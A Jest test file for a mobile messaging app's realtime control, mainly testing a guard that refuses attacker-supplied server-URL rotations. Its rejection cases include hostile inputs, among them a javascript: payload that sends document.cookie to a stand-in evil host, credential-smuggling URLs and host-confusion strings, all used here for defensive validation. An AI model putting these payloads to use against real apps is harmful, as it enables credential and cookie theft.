// `applyNewServerUrl` lives in realtimeControl, whose import graph pulls the whole realtime wiring
// (ky, op-sqlite, expo-file-system, notify-kit). Stub only the leaf modules with native/ESM deps so
// the function under test — and the real session store it mutates — stay REAL.
jest.mock('@core/api', () => ({ serverApi: { ping: jest.fn(), serverInfo: jest.fn() } }));
jest.mock('@core/secure', () => ({
  ACCOUNT_REVOCATION_CLEAR_FAILURE_MESSAGE: 'Could not activate the saved server session.',
  SERVER_SESSION_STATE: { writing: 'writing', active: 'active', forgotten: 'forgotten' },
  logger: {
    debug: jest.fn(),
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
  },
}));
jest.mock('@db/database', () => ({ getDatabase: jest.fn(), ensureDatabase: jest.fn() }));
jest.mock('@/services/clients', () => ({
  http: { buildHeaders: () => ({}), usesHeaderAuth: () => true },
  vault: { set: jest.fn(async () => {}), get: jest.fn(async () => null) },
  candidateClient: jest.fn(),
  accountRevocationMarker: { clear: jest.fn() },
}));
jest.mock('@/services/backgrounds/syncedBackground', () => ({ ensureSyncedBackground: jest.fn() }));
jest.mock('@/services/databaseControl', () => ({ ensureDatabase: jest.fn(async () => ({})) }));
jest.mock('@/services/syncControl', () => ({ maybeResumeSync: jest.fn() }));
jest.mock('@/services/download/autoDownloadAttachments', () => ({
  autoDownloadMessageAttachments: jest.fn(),
}));
jest.mock('@/services/reachability', () => ({ startReachabilityWatch: jest.fn() }));
jest.mock('@/services/notifications/notifeeService', () => ({
  postNotification: jest.fn(async () => {}),
  requestNotificationPermission: jest.fn(async () => {}),
}));

// Jest mocks must be registered before importing the realtime source graph.
/* eslint-disable import/first */
import { type EventSink, type NormalizedEvent } from '@core/realtime';
import { useFeatureSettingsStore } from '@state/featureSettingsStore';
import { useLockStore } from '@state/lockStore';
import { useSessionStore } from '@state/sessionStore';
import { ServerUrlEventSink } from '@/services/realtime/serverUrlEventSink';
import { serverRotationCoordinator } from '@/services/realtime/serverRotationCoordinator';
import { DurableRealtimeDispatcher } from '@/services/realtime/incomingEventDispatcher';
import {
  captureRealtimeDeliveryLease,
  resumeRealtimeDeliveries,
} from '@/services/realtime/deliveryCoordinator';
import {
  applyNewServerUrl,
  approveNewServerUrl,
  dispatchRealtimeEvent,
  pauseRealtime,
  resumeRealtime,
  setSocket,
  shouldPresentMessageNotification,
} from '@/services/realtimeControl';
/* eslint-enable import/first */

const { serverApi: mockServerApi } = jest.requireMock('@core/api') as {
  serverApi: { serverInfo: jest.Mock };
};
const { vault: mockVault, accountRevocationMarker: mockRevocationMarker } = jest.requireMock(
  '@/services/clients',
) as {
  vault: { set: jest.Mock };
  accountRevocationMarker: { clear: jest.Mock };
};
const { candidateClient: mockCandidateClient } = jest.requireMock('@/services/clients') as {
  candidateClient: jest.Mock;
};
const { ensureDatabase: mockEnsureDatabase } = jest.requireMock('@/services/databaseControl') as {
  ensureDatabase: jest.Mock;
};

const ev = (e: unknown): NormalizedEvent => e as NormalizedEvent;

describe('headless message-notification feature gate', () => {
  it.each([
    [{ hydrated: false, messageNotifications: true }, false],
    [{ hydrated: false, messageNotifications: false }, false],
    [{ hydrated: true, messageNotifications: false }, false],
    [{ hydrated: true, messageNotifications: true }, true],
  ] as const)('maps %p to %p', (settings, expected) => {
    expect(shouldPresentMessageNotification(settings)).toBe(expected);
  });

  it('enters durable intake before an unresolved feature-settings read', async () => {
    setSocket(null);
    resumeRealtimeDeliveries();
    useFeatureSettingsStore.setState({ hydrated: false });
    let releaseFeatures!: () => void;
    const featureHydrate = jest
      .spyOn(useFeatureSettingsStore.getState(), 'hydrate')
      .mockReturnValue(
        new Promise<void>((resolve) => {
          releaseFeatures = resolve;
        }),
      );
    const persist = jest
      .spyOn(DurableRealtimeDispatcher.prototype, 'handle')
      .mockResolvedValue(null);
    const lease = captureRealtimeDeliveryLease();

    try {
      await expect(
        dispatchRealtimeEvent('new-message', { guid: 'headless-pending' }, 'fcm', lease),
      ).resolves.toBeUndefined();

      // Hydration now belongs to the post-checkpoint notification phase, not pre-persistence.
      expect(featureHydrate).not.toHaveBeenCalled();
      expect(persist).toHaveBeenCalledWith(
        'new-message',
        expect.objectContaining({ guid: 'headless-pending' }),
        'fcm',
        expect.objectContaining({ generation: lease.generation }),
        undefined,
        expect.any(Number),
      );
      expect(shouldPresentMessageNotification(useFeatureSettingsStore.getState())).toBe(false);
    } finally {
      releaseFeatures?.();
      await Promise.resolve();
      setSocket(null);
      persist.mockRestore();
      featureHydrate.mockRestore();
      useFeatureSettingsStore.setState({ hydrated: true });
    }
  });

  it('does not open the database or admit a socket callback after App Lock engages', async () => {
    setSocket(null);
    resumeRealtimeDeliveries();
    useLockStore.setState({
      enabled: true,
      hydrated: true,
      locked: true,
      lastBackgrounded: null,
      timeoutMs: 30_000,
    });
    mockEnsureDatabase.mockClear();
    const persist = jest.spyOn(DurableRealtimeDispatcher.prototype, 'handle');
    const lease = captureRealtimeDeliveryLease();

    try {
      await expect(
        dispatchRealtimeEvent('new-message', { guid: 'arrived-after-lock' }, 'socket', lease),
      ).resolves.toBeUndefined();

      expect(mockEnsureDatabase).not.toHaveBeenCalled();
      expect(persist).not.toHaveBeenCalled();
    } finally {
      persist.mockRestore();
      useLockStore.setState({ enabled: false, hydrated: true, locked: false });
      setSocket(null);
    }
  });
});

describe('ServerUrlEventSink', () => {
  it('routes a new-server URL rotation to onNewUrl and short-circuits the inner sink', async () => {
    const inner: EventSink = { onEvent: jest.fn() };
    const onNewUrl = jest.fn();
    await new ServerUrlEventSink(inner, onNewUrl).onEvent(
      ev({ type: 'new-server', url: 'https://rotated.example.com' }),
      'socket',
    );
    expect(onNewUrl).toHaveBeenCalledWith('https://rotated.example.com', undefined);
    expect(inner.onEvent).not.toHaveBeenCalled();
  });

  it('delegates every other event to the inner sink untouched', async () => {
    const inner: EventSink = { onEvent: jest.fn() };
    const onNewUrl = jest.fn();
    const event = ev({ type: 'new-message', payload: {} });
    await new ServerUrlEventSink(inner, onNewUrl).onEvent(event, 'fcm');
    expect(inner.onEvent).toHaveBeenCalledWith(event, 'fcm', undefined);
    expect(onNewUrl).not.toHaveBeenCalled();
  });

  it('propagates an inner-sink failure (does not swallow it)', async () => {
    const inner: EventSink = { onEvent: jest.fn().mockRejectedValue(new Error('db write failed')) };
    await expect(
      new ServerUrlEventSink(inner, jest.fn()).onEvent(
        ev({ type: 'new-message', payload: {} }),
        'socket',
      ),
    ).rejects.toThrow('db write failed');
  });
});

/**
 * The containment guard on the far side of the sink's `onNewUrl` callback.
 *
 * `new-server` is attacker-reachable: it arrives over FCM/socket and re-points BOTH the persisted
 * credential and every subsequent authenticated request (the password rides in the Authorization
 * header, so the origin decides who receives it). A valid https URL is not enough: a foreign host
 * or port is still a credential-exfiltration target and needs foreground approval.
 */
describe('applyNewServerUrl containment guard', () => {
  const ORIGINAL_ORIGIN = 'https://original.example.com';

  beforeEach(() => {
    pauseRealtime();
    useSessionStore.setState({ origin: ORIGINAL_ORIGIN, password: null });
    mockVault.set.mockClear();
  });

  it.each([
    'https://rotated.example.com',
    'https://original.example.com:8443',
    'http://original.example.com',
    'http://192.168.1.11:1234',
  ])('quarantines cross-origin or downgraded target %s', async (url) => {
    await applyNewServerUrl(url);
    expect(useSessionStore.getState().origin).toBe(ORIGINAL_ORIGIN);
    expect(mockVault.set).not.toHaveBeenCalled();
  });

  it.each([
    'https://original.example.com',
    'https://original.example.com/',
    'HTTPS://ORIGINAL.EXAMPLE.COM:443',
  ])('treats the already-trusted canonical origin %s as a no-op', async (url) => {
    await applyNewServerUrl(url);
    expect(useSessionStore.getState().origin).toBe(ORIGINAL_ORIGIN);
    expect(mockVault.set).not.toHaveBeenCalled();
  });

  it.each([
    'javascript:fetch("https://evil.example/"+document.cookie)',
    'file:///data/data/com.gator/files',
    'intent://evil.example/#Intent;scheme=https;end',
    'ws://evil.example',
    '//evil.example',
    'evil.example',
    'https://user:secret@original.example.com',
    'https://original.example.com/api',
    'https://original.example.com?next=https://evil.example',
    'https://original.example.com#fragment',
    'https://original.example.com\\@evil.example',
    'not a url at all',
    '',
  ])('rejects %p — origin unchanged and nothing persisted', async (url) => {
    await applyNewServerUrl(url);
    expect(useSessionStore.getState().origin).toBe(ORIGINAL_ORIGIN);
    expect(mockVault.set).not.toHaveBeenCalled();
  });

  it('rejects even an otherwise valid origin with leading/trailing whitespace', async () => {
    await applyNewServerUrl('   https://original.example.com   ');
    expect(useSessionStore.getState().origin).toBe(ORIGINAL_ORIGIN);
    expect(mockVault.set).not.toHaveBeenCalled();
  });
});

describe('new-server production admission', () => {
  const ORIGINAL_ORIGIN = 'https://original.example.com';

  async function activateForegroundSession(): Promise<void> {
    pauseRealtime();
    useLockStore.setState({ enabled: false, hydrated: true, locked: false });
    useSessionStore.setState({
      status: 'connected',
      origin: ORIGINAL_ORIGIN,
      password: null,
      error: null,
    });
    // This establishes the real foreground authority bit without starting HTTP/socket work.
    await resumeRealtime();
    useSessionStore.setState({ password: 'current-password' });
    mockEnsureDatabase.mockClear();
    mockVault.set.mockReset().mockImplementation(async () => undefined);
    mockCandidateClient.mockReset();
    mockServerApi.serverInfo.mockReset();
    mockRevocationMarker.clear.mockReset();
  }

  afterEach(() => {
    pauseRealtime();
    serverRotationCoordinator.cancel();
  });

  it.each([
    ['malformed origin', 'https://evil.example/path'],
    ['credential smuggling', 'https://user:secret@evil.example'],
    ['HTTPS downgrade', 'http://original.example.com'],
  ])('rejects %s before DB, candidate client, credential, or prompt use', async (_label, url) => {
    await activateForegroundSession();

    await dispatchRealtimeEvent('new-server', url, 'socket');

    expect(mockEnsureDatabase).not.toHaveBeenCalled();
    expect(mockCandidateClient).not.toHaveBeenCalled();
    expect(mockVault.set).not.toHaveBeenCalled();
    expect(serverRotationCoordinator.getSnapshot()).toBeNull();
    expect(useSessionStore.getState().origin).toBe(ORIGINAL_ORIGIN);
  });

  it('offers a canonical foreign HTTPS origin without DB, request, Authorization, or persistence', async () => {
    await activateForegroundSession();

    await dispatchRealtimeEvent('new-server', 'HTTPS://NEXT.EXAMPLE:443/', 'socket');

    expect(serverRotationCoordinator.getSnapshot()).toEqual(
      expect.objectContaining({
        currentOrigin: ORIGINAL_ORIGIN,
        candidateOrigin: 'https://next.example',
        requiresCleartextApproval: false,
      }),
    );
    expect(mockEnsureDatabase).not.toHaveBeenCalled();
    expect(mockCandidateClient).not.toHaveBeenCalled();
    expect(mockVault.set).not.toHaveBeenCalled();
    expect(useSessionStore.getState().origin).toBe(ORIGINAL_ORIGIN);
  });

  it('wires approved validation into one correlated credential commit before publication', async () => {
    await activateForegroundSession();
    const candidate = { name: 'candidate-client' };
    const info = { server_version: '1.9.0' };
    mockCandidateClient.mockReturnValue(candidate);
    mockServerApi.serverInfo.mockResolvedValue(info);
    // Background after the durable tuple becomes active. This prevents unrelated socket startup
    // while proving an already-approved commit may finish and publish coherently.
    mockVault.set.mockImplementation(async (key: string, value: string) => {
      if (key === 'serverSessionState' && value === 'active') pauseRealtime();
    });

    await dispatchRealtimeEvent('new-server', 'HTTPS://NEXT.EXAMPLE:443/', 'socket');
    const requestId = serverRotationCoordinator.getSnapshot()!.id;

    await expect(approveNewServerUrl(requestId, 'current-password', false)).resolves.toEqual({
      ok: true,
    });
    expect(mockCandidateClient).toHaveBeenCalledWith('https://next.example', 'current-password');
    expect(mockServerApi.serverInfo).toHaveBeenCalledWith(candidate);
    expect(mockVault.set.mock.calls).toEqual([
      ['serverSessionState', 'writing'],
      ['serverAddress', 'https://next.example'],
      ['serverPassword', 'current-password'],
      ['serverSessionState', 'active'],
    ]);
    expect(mockRevocationMarker.clear).toHaveBeenCalledTimes(1);
    expect(useSessionStore.getState()).toEqual(
      expect.objectContaining({
        status: 'connected',
        origin: 'https://next.example',
        password: 'current-password',
        serverInfo: info,
      }),
    );
    expect(serverRotationCoordinator.getSnapshot()).toBeNull();
    expect(mockEnsureDatabase).not.toHaveBeenCalled();
  });

  it('drops a foreign event without durable deferral when foreground authority is absent', async () => {
    await activateForegroundSession();
    pauseRealtime();
    mockEnsureDatabase.mockClear();

    await dispatchRealtimeEvent('new-server', 'https://next.example', 'fcm');

    expect(serverRotationCoordinator.getSnapshot()).toBeNull();
    expect(mockEnsureDatabase).not.toHaveBeenCalled();
    expect(mockCandidateClient).not.toHaveBeenCalled();
    expect(mockVault.set).not.toHaveBeenCalled();
  });

  it('drops a same-origin spelling as a no-op before opening the database', async () => {
    await activateForegroundSession();

    await dispatchRealtimeEvent('new-server', 'HTTPS://ORIGINAL.EXAMPLE.COM:443/', 'socket');

    expect(serverRotationCoordinator.getSnapshot()).toBeNull();
    expect(mockEnsureDatabase).not.toHaveBeenCalled();
    expect(mockCandidateClient).not.toHaveBeenCalled();
    expect(mockVault.set).not.toHaveBeenCalled();
  });
});
